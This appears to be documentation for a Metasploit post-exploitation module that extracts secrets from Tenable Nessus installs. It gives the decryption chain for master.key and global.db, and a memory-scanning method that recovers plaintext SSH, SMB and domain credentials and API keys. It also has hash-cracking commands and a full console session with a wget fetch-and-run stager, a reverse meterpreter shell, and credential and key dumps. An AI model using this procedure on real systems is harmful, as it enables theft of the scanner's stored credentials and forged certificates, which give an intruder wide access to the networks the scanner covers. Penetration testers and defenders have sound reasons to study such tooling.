## Vulnerable Application

This module extracts secrets from an installed Tenable Nessus
scanner (or Nessus Agent). It runs in these lanes:

`FILES` - loot `master.key`, the encrypted `global.db` (+wal/shm), the
scanner CA/TLS keys (certificate forgery) and the web UI password
hashes for offline work.

`DECRYPT_DB` - the at-rest chain runs ON THE TARGET inside the
python extractor (openssl CLI, no extra deps) and needs no
process memory at all: `master.key` is unwrapped with a constant
hardcoded in nessusd/nessuscli (AES-128-OFB), yielding a SQLite
PASSWD table whose secret derives the per-install file key via
RC4[0::8]; `global.db` + its WAL then decrypt block-by-block and
UserApiKeys rows, the PASSWD secret and the file key are
reported. The FILES action additionally decrypts the looted
files OPERATOR-SIDE in Ruby (works when transfers are small
enough; large DBs are covered by the on-target lane).

`MEMORY` - nessusd holds every scan policy credential in plaintext
in its heap (serialized policy JSON plus the decrypted database
page cache), so with root the module scans the process memory and
recovers SSH/SMB/AD/etc usernames, passwords, domains, SSH
private keys and REST API key pairs (accessKey/secretKey - the
secretKey only ever exists in plaintext here, at rest it is
stored hashed) regardless of the at-rest database encryption.

The agent linking key and the NASL plugin signature check status
are also collected via nessuscli when possible, along with
scanner info: plugin set (+decoded stamp), feed type, plugin
database update time and policy template version.

The extractor also emits a NessusClientData_v2 .nessus XML
export for every decrypted report (verified semantically against
the live export API). DUMP_SCANS (default -1 = all, ALL action)
pulls those XMLs back as loot; 0 disables, N pulls only the N
most recently modified source reports. IMPORT_SCANS (default
false) then db_imports them into the Metasploit workspace
(hosts/ports/vulns; credentials are always reported via the
creds tables regardless).

REST API keys at rest are MD5(salt_hex + secret_hex) in the
UserApiKeys table (accessKey plaintext, secretKey hashed), so
stored rows are captured any time and written to a hashcat-ready
loot file (api_key_hashes.hashcat, one hash:salt per line). Crack
the secretKey offline with:
`hashcat -m 20 api_key_hashes.hashcat <wordlist or mask>`
(-m 20 = md5($salt.$pass))
`john --format=dynamic_4 api_key_hashes.hashcat`
(dynamic_4 = md5($s.$p))
The secretKey is server-generated random 64-hex (256 bits), so
brute force is infeasible - this pays off only against a weak
generator or candidates obtained elsewhere (client configs,
leaks), verified offline with no API traffic.

Tested against Nessus 10.12.0 (Nessus Professional, Ubuntu).

A lab environment can be started with Docker:

```
docker run -d --name nessus -p 8834:8834 tenable/nessus:latest-ubuntu
```

Then finish setup at `https://127.0.0.1:8834` (create the initial admin user,
activate with a free Home/Professional feed), create a scan policy with
SSH/SMB credentials, and run at least one scan so there are on-disk reports.
The Nessus install lives in `/opt/nessus` (agents: `/opt/nessus_agent`), both
in the Docker image and on native Ubuntu/RHEL installs. You will likely need
to register a license, a free one will suffice.

This module has been tested against the following versions:

* Nessus 10.12.0 (Professional, Docker `tenable/nessus:latest-ubuntu`)

## Background

Nessus encrypts its databases at rest. The chain, reverse engineered and
verified against live `nessuscli`, is:

```text
master.key  = AES-128-OFB(K_HARDCODED)          [key hardcoded in nessusd/nessuscli]
plaintext   = tiny SQLite db, table PASSWD(id, passwd)   [the install secret]
K_file      = RC4(secret)[0::8][:32]
data files  = AES-128-OFB(K_file[:16]) per 1024-byte block,
              tweak = u32le(block#) || block-tail-12, block-1 marker kept plaintext
```

Data files using that envelope include `global.db`, per-user `policies.db`,
and every on-disk report in `var/nessus/users/*/reports/*` (each decrypts to
a scan-results SQLite db). `global.db-wal` is not enveloped: each WAL frame
holds a single page image encrypted the same way, keyed by the frame's page
number. If a future Nessus version stops decrypting, the constants to
re-check are K_HARDCODED (two copies each in `sbin/nessusd` and
`sbin/nessuscli`) and the marker bytes at envelope offset 16.

REST API keys at rest are stored in the `UserApiKeys` table as
`{"hash": MD5(salt_hex + secret_hex), "accessKey": <plaintext>, "salt"}`.
The secretKey itself only exists in plaintext in nessusd process memory (at
generation time), which is why the MEMORY lane and the at-rest harvest report
different things.

## Verification Steps

1. Install and activate Nessus (Docker command above), create a credentialed
   scan policy, and run a scan so reports exist
2. Get a root shell or meterpreter session on the Nessus host
3. Start msfconsole
4. Do: `use post/linux/gather/nessus_secrets`
5. Do: `set session [#]`
6. Do: `run`
7. You should get the looted files table, the PASSWD secret and file key,
   any policy credentials/API keys, and `.nessus` XML loot for each report.

## ACTION

### FILES

Loots key material, the encrypted `global.db` (+wal/shm), CA/TLS keys,
and web UI password hashes.

### MEMORY

uploads a python3 extractor that scans nessusd's heap for policy credentials, SSH keys, and API key pairs, and also
performs the full at-rest decryption on the target.

### ALL (default)

Runs everything, which is what you almost always want

## Options

### NESSUS_DIR

The Nessus install root. Auto-detected (`/opt/nessus`,
`/opt/nessus_agent`) when blank.

### GET_DB

Also loot `global.db` + `global.db-wal` + `global.db-shm` for offline
processing. (Default: `true`)

### DECRYPT_DB

After the FILES lane loots master.key and global.db, decrypt them
operator-side in Ruby and harvest UserApiKeys rows, policy credentials, and
users from the plaintext database. Skipped automatically when the on-target
extractor already ran the same chain. (Default: `true`)

### DUMP_SCANS

Pull decrypted scans back as `.nessus` XML loot (ALL action only). The
extractor rebuilds the NessusClientData_v2 XML on the target from each
decrypted report database, verified semantically against the live export
API. `-1` (default) pulls all, `0` disables, `N` pulls only the N most
recently modified source reports.

### IMPORT_SCANS

`db_import` the dumped `.nessus` files into the current Metasploit
workspace (hosts/ports/vulns). Credentials are reported via the creds tables
regardless of this option. (Default: `false`)

### MEM_LIMIT

Maximum MB of nessusd memory to scan per process. (Default: `4096`)

### Cracking the API key hashes

The at-rest harvest writes `api_key_hashes.hashcat` (one `hash:salt` per
line, MD5(salt_hex + secret_hex)):

```
hashcat -m 20 api_key_hashes.hashcat <wordlist or mask>
john --format=dynamic_4 api_key_hashes.hashcat
```

The secretKey is server-generated random 64-hex (256 bits), so brute force
only pays off against a weak generator or candidates obtained elsewhere.

## Scenarios

### Nessus 10.12.0, root meterpreter, ALL action, IMPORT_SCANS true

```
$ ./msfconsole -q
[*] Processing /root/.msf4/msfconsole.rc for ERB directives.
resource (/root/.msf4/msfconsole.rc)> setg verbose true
verbose => true
resource (/root/.msf4/msfconsole.rc)> setg session -1
session => -1
resource (/root/.msf4/msfconsole.rc)> setg lhost 1.1.1.1
lhost => 1.1.1.1
resource (/root/.msf4/msfconsole.rc)> setg payload cmd/linux/http/x64/meterpreter/reverse_tcp
payload => cmd/linux/http/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> use exploit/multi/script/web_delivery
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> set target 7
target => 7
resource (/root/.msf4/msfconsole.rc)> set srvport 8082
srvport => 8082
resource (/root/.msf4/msfconsole.rc)> set uripath l
uripath => l
resource (/root/.msf4/msfconsole.rc)> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> set lport 4446
lport => 4446
resource (/root/.msf4/msfconsole.rc)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Starting persistent handler(s)...
[*] Started reverse TCP handler on 1.1.1.1:4446 

[*] Using URL: http://1.1.1.1:8082/l
[*] Server started.
[*] Run the following command on the target machine:
wget -qO kWaVqVzA --no-check-certificate http://1.1.1.1:8082/l; chmod +x kWaVqVzA; ./kWaVqVzA& disown
msf exploit(multi/script/web_delivery) > [*] 172.21.0.2       web_delivery - Delivering Payload (250 bytes)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3090404 bytes) to 172.21.0.2
[*] Meterpreter session 1 opened (1.1.1.1:4446 -> 172.21.0.2:36476) at 2026-09-13 16:36:46 -0400

msf exploit(multi/script/web_delivery) > use post/linux/gather/nessus_secrets 
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Setting default action ALL - view all 3 actions with the show actions command
msf post(linux/gather/nessus_secrets) > set import_scans true
import_scans => true
msf post(linux/gather/nessus_secrets) > run
[*] Nessus install: /opt/nessus
[*] Nessus version: 10.12.0
[*] Plugin set: 202609070943 (2026-09-07 09:43)
[*] Plugin feed: ProfessionalFeed (Direct)
[*] Plugins last updated: 2026-09-11 14:14:31
[*] Policy template version: 202609021543
[+] Nessus Looted Files
===================

 File                                                 Size   Loot
 ----                                                 ----   ----
 /opt/nessus/com/nessus/CA/cacert.pem                 1467   /root/.msf4/loot/20260913163715_default_172.21.0.2_nessus.cacert.pe_797574.pem
 /opt/nessus/com/nessus/CA/servercert.pem             1467   /root/.msf4/loot/20260913163715_default_172.21.0.2_nessus.servercer_387594.pem
 /opt/nessus/etc/nessus/nessusd.conf.imported         6565   /root/.msf4/loot/20260913163715_default_172.21.0.2_nessus.nessusd.c_213199.txt
 /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc  133    /root/.msf4/loot/20260913163716_default_172.21.0.2_nessus.plugin_fe_670929.txt
 /opt/nessus/var/nessus/CA/cakey.pem                  1703   /root/.msf4/loot/20260913163714_default_172.21.0.2_nessus.cakey.pem_550572.pem
 /opt/nessus/var/nessus/CA/serverkey.pem              1703   /root/.msf4/loot/20260913163714_default_172.21.0.2_nessus.serverkey_915248.pem
 /opt/nessus/var/nessus/global.db                     65536  /root/.msf4/loot/20260913163713_default_172.21.0.2_nessus.global.db_946558.db
 /opt/nessus/var/nessus/global.db-shm                 32768  /root/.msf4/loot/20260913163714_default_172.21.0.2_nessus.global.db_617823.dbshm
 /opt/nessus/var/nessus/global.db-wal                 65536  /root/.msf4/loot/20260913163713_default_172.21.0.2_nessus.global.db_361034.dbwal
 /opt/nessus/var/nessus/master.key                    2048   /root/.msf4/loot/20260913163713_default_172.21.0.2_nessus.master.ke_762059.key
 /opt/nessus/var/nessus/nessus.version                7      /root/.msf4/loot/20260913163716_default_172.21.0.2_nessus.nessus.ve_088994.txt
 /opt/nessus/var/nessus/users/h00die/auth/hash        164    /root/.msf4/loot/20260913163716_default_172.21.0.2_nessus.user_h00d_308070.txt

[*] global.db/master.key looted (envelope-encrypted; the extractor decrypts them on-target)
[*] Uploading extractor to /tmp/RGL3mj4p2
[*] Running python3 extractor
[*] nessusd pid 166271: scanned 1091563520 bytes
[+] Agent linking key: db08d329a1bba7fd49bd270410fa3c2017c51904fa14922665f42bcafd545514
[*] NASL plugin signature checking: no
[+] At-rest PASSWD secret (on-target decrypt): NKIN3ndo4rhUlN2UgQZlddCYSolgfzunLvuGFG8PvIjAzvLhGoHoWw3vt42tQ0ln
[*] global.db file key: 28d2ca60bc73e8c7b5e54105a09358bb
[+] Report DECRYPTED on-target: /opt/nessus/var/nessus/users/h00die/reports/b41f23d6-d956-ae1d-f60c-c97f8ee1477cb51930935a35dab1
[+] Report DECRYPTED on-target: /opt/nessus/var/nessus/users/h00die/reports/f30cf4c9-f3f7-3996-df9f-a88df4b63e53a34e35719f64649d
[+] Report DECRYPTED on-target: /opt/nessus/var/nessus/users/h00die/reports/4af8f700-7525-cdb6-d259-8ff0a3d8f310fbeedc2385d36286
[+] Report DECRYPTED on-target: /opt/nessus/var/nessus/users/h00die/reports/1c40b56d-ae70-29de-c799-d157c7a9ea23dd77d961c4a73405
[*] Scan policy credentials recovered from 4 decrypted policies (see Nessus Policy Credentials)
[+] Full extractor output stored to: /root/.msf4/loot/20260913163729_default_172.21.0.2_nessus.creds_306506.json
[+] Nessus Policy Credentials
=========================

 Service  Auth      Username                   Password                   Domain
 -------  ----      --------                   --------                   ------
 SNMPv3   password  example_snmp_username
 SSH      password  garbage-selfread-e2db5f27  garbage-selfread-e2db5f27
 SSH      password  garbage-selfread-de379915  garbage-selfread-de379915
 SSH      password  garbage-selfread-ba363f55  garbage-selfread-ba363f55
 SSH      password  example_username           example_password
 Windows  Password  example_username           example_password           example_domain

[*] hashcat-ready hash:salt file: /root/.msf4/loot/20260913163730_default_172.21.0.2_nessus.api_key_h_900799.txt (hashcat -m 20 / john --format=dynamic_4)
[+] Nessus REST API Keys (stored rows - secret recoverable only at generation)
==========================================================================

 Access Key                                       MD5(salt+secret)                  Salt
 ----------                                       ----------------                  ----
 629ae9809b2a10eab48c76a96825adc4d9aa3e10f334b9e  9e7cb43bd9c824fc320a3aede2866ce8  2f2f0130f255c29bd34588bc7da348647266e794362cbe1de229a8f0cbb2e7e6
 d3411e4b92a9a1dd7

[*] DECRYPT_DB: on-target decrypt already harvested everything - skipping the operator-side lane
[*] Pulling ALL scan XML exports from the decrypted reports
[+] b41f23d6-d956-ae1d-f60c-c97f8ee1477cb51930935a35dab1.nessus -> /root/.msf4/loot/20260913163744_default_172.21.0.2_nessus.scan.xml_866656.nessus (import: 7 hosts, 265 ports, 322 vulnerabilities)
[+] f30cf4c9-f3f7-3996-df9f-a88df4b63e53a34e35719f64649d.nessus -> /root/.msf4/loot/20260913163801_default_172.21.0.2_nessus.scan.xml_316405.nessus (import: 7 hosts, 272 ports, 330 vulnerabilities)
[+] 1c40b56d-ae70-29de-c799-d157c7a9ea23dd77d961c4a73405.nessus -> /root/.msf4/loot/20260913163806_default_172.21.0.2_nessus.scan.xml_252533.nessus (import: 1 host, 1 port, 1 vulnerability)
[+] 4af8f700-7525-cdb6-d259-8ff0a3d8f310fbeedc2385d36286.nessus -> /root/.msf4/loot/20260913163807_default_172.21.0.2_nessus.scan.xml_789445.nessus (import: 1 host, 1 port, 1 vulnerability)
[*] Pulled 4 .nessus XML files as loot
[+] Imported 20260913163744_default_172.21.0.2_nessus.scan.xml_866656.nessus: 5 hosts, 319 vulnerabilities
[+] Imported 20260913163801_default_172.21.0.2_nessus.scan.xml_316405.nessus: 0 hosts, 8 vulnerabilities
[+] Imported 20260913163806_default_172.21.0.2_nessus.scan.xml_252533.nessus: 1 host, 1 vulnerability
[+] Imported 20260913163807_default_172.21.0.2_nessus.scan.xml_789445.nessus: 0 hosts, 0 vulnerabilities
[*] Post module execution completed
msf post(linux/gather/nessus_secrets) > 
```

### Notes on sessions and transfer size

On shell sessions, single-command output is effectively capped around 64KB,
so the module pulls large files (global.db, scan XML) as chunked
`dd | base64` reads. This is reliable but slow for very large scans. On
meterpreter sessions file transfer is not size-limited. If a `.nessus` import
fails with malformed XML, the loot file was likely corrupted in transfer on a
non-meterpreter session - upgrade with `run post/multi/manage/shell_to_meterpreter`
before attempting large file transfers.

The MEMORY lane requires python3 on the target (present on virtually every
modern Linux install); without it, loot the files with the FILES lane and
decrypt offline instead.
